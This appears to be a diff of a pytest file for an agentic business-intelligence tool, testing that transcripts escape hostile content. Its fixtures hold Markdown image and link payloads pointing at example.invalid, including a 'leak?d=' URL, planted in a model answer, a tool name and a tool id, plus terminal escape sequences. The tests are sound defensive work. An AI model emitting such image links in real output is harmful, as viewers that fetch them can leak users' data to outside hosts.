@@ -10,8 +10,7 @@ from typing import Any
 import pytest
 
 from agentic_bi.agent import ReplayModel, ask
-from agentic_bi.agent.cli import printable
-from agentic_bi.agent.transcript import render_markdown, slug, write_transcript
+from agentic_bi.agent.transcript import printable, render_markdown, slug, write_transcript
 
 # An answer that tries to break out of a code block and make a Markdown viewer fetch a URL.
 SNEAKY = "Done.\n````\n![x](https://example.invalid/leak?d=x) and [link](https://example.invalid)"
@@ -108,3 +107,77 @@ def test_slug_is_a_safe_file_stem(question: str, expected: str) -> None:
 def test_printable_escapes_terminal_control_characters() -> None:
     text = "ok\n\ttab \x1b[31mred\x1b[0m \x07 \x9b"
     assert printable(text) == "ok\n\ttab \\x1b[31mred\\x1b[0m \\x07 \\x9b"
+
+
+def test_a_hostile_tool_name_or_id_never_renders_as_markdown(synthetic_toolbox) -> None:
+    name = "catalog` ![x](https://example.invalid/p.png) [click](https://example.invalid) `"
+    hostile = {
+        "type": "tool_use",
+        "id": "toolu_`![y](https://example.invalid/q.png)`",
+        "name": name,
+        "input": {},
+    }
+    reply = json.dumps({"status": "answered", "answer": "Net obligations were $3,600.00."})
+    turns = [
+        {"stop_reason": "tool_use", "content": [hostile]},
+        {
+            "stop_reason": "tool_use",
+            "content": [
+                {
+                    "type": "tool_use",
+                    "id": "toolu_t2",
+                    "name": "run_query",
+                    "input": {"metric": "obligations", "time_range": FY},
+                }
+            ],
+        },
+        {"stop_reason": "end_turn", "content": [{"type": "text", "text": reply}]},
+    ]
+    result = ask("Net obligations?", model=ReplayModel(turns), toolbox=synthetic_toolbox)
+    assert result.answer.status == "answered"
+    for line in _outside_fences(render_markdown(result.transcript)):
+        assert "example.invalid" not in line or "\\[" in line or "\\!" in line, line
+        assert re.search(r"(?<!\\)!\[|(?<!\\)\]\(", line) is None, line
+
+
+def test_an_unpaired_surrogate_never_stops_a_transcript_or_the_terminal(
+    synthetic_toolbox, tmp_path: Path
+) -> None:
+    lone = "a\ud800b"
+    turns = [
+        {
+            "stop_reason": "tool_use",
+            "content": [
+                {
+                    "type": "tool_use",
+                    "id": "toolu_s1",
+                    "name": "schema",
+                    "input": {"dimension": "recipient", "search": lone},
+                },
+                {
+                    "type": "tool_use",
+                    "id": "toolu_s2",
+                    "name": "run_query",
+                    "input": {"metric": "obligations", "time_range": FY},
+                },
+            ],
+        },
+        {
+            "stop_reason": "end_turn",
+            "content": [
+                {
+                    "type": "text",
+                    "text": json.dumps(
+                        {"status": "answered", "answer": f"Net obligations were $3,600.00 {lone}."}
+                    ),
+                }
+            ],
+        },
+    ]
+    result = ask("Net obligations?", model=ReplayModel(turns), toolbox=synthetic_toolbox)
+    assert result.answer.status == "answered"
+    json_path, md_path = write_transcript(tmp_path, "01-lone", result.transcript)
+    assert json.loads(json_path.read_text("utf-8"))["answer"]["text"] == result.answer.text
+    assert "\\ud800" in md_path.read_text("utf-8")
+    assert printable(lone) == "a\\ud800b"
+    printable(result.answer.text).encode("utf-8")
